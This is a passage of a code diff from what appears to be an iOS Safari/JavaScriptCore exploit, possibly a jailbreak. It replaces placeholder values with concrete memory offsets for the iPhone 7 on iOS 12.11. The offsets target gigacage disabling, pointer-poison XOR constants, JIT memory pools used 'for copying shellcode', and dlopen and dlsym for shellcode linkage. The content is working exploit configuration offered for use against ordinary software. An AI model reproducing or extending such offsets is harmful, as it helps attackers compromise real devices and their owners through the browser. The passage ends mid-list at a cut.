@@ -372,19 +372,19 @@ offsets[12.01]["iPhone 5S"] ={
 };
 
 offsets[12.11]["iPhone 7"] ={
-	nativejitcode: MISSING_OFFSET, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
+	nativejitcode: 0x1888bd210, 					// JSC::NativeJITCode::~NativeJITCode() from JavaScriptCore
     vtable: MISSING_OFFSET, 							// HTMLDivElement vtable from JavaScriptCore
-    dlopen: MISSING_OFFSET, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
+    dlopen: 0x180921bd8, 							// From libdyld.dylib (For @5aelo's new mach-o approach)
     confstr: MISSING_OFFSET, 							// From libsystem_c.dylib (For @5aelo's new mach-o approach)
-    disableprimitivegigacage: MISSING_OFFSET, 			// From JavaScriptCore 
-    g_gigacagebaseptrs: MISSING_OFFSET, 				// From JavaScriptCore 
-  	g_jsarraybufferpoison: MISSING_OFFSET, 			// From JavaScriptCore (For XOR with leaked buffer)
-  	g_jitcodepoison: MISSING_OFFSET, 					// From JavaScriptCore (For XOR with leaked code)
+    disableprimitivegigacage: 0x188211ba0, 			// From JavaScriptCore 
+    g_gigacagebaseptrs: 0x1b8c58000, 				// From JavaScriptCore 
+  	g_jsarraybufferpoison: 0x1b8c5c1a0, 			// From JavaScriptCore (For XOR with leaked buffer)
+  	g_jitcodepoison: 0x1b8c5c190, 					// From JavaScriptCore (For XOR with leaked code)
     g_typedarraypoisons: MISSING_OFFSET, 						// Removed as of iOS 11.4 
-    startfixedmempool: MISSING_OFFSET, 				// From JavaScriptCore (For copying shellcode)
-    endfixedmempool: MISSING_OFFSET, 					// From JavaScriptCore (For copying shellcode)
-    jit_writeseperateheaps_func: MISSING_OFFSET,		// From JavaScriptCore (For detecting below i8)
-    usefastpermissions_jitcopy: MISSING_OFFSET,		// From JavaScriptCore (For detecting i8 and up)
+    startfixedmempool: 0x1bad790c0, 				// From JavaScriptCore (For copying shellcode)
+    endfixedmempool: 0x1bad790c8, 					// From JavaScriptCore (For copying shellcode)
+    jit_writeseperateheaps_func: 0x1bad790d0,		// From JavaScriptCore (For detecting below i8)
+    usefastpermissions_jitcopy: 0x1b8c5c018,		// From JavaScriptCore (For detecting i8 and up)
     ptr_stack_check_guard: MISSING_OFFSET,				// To make our JITMemCpy work
     dlsym: MISSING_OFFSET,								// For our shellcode + linkage
     longjmp: MISSING_OFFSET,					
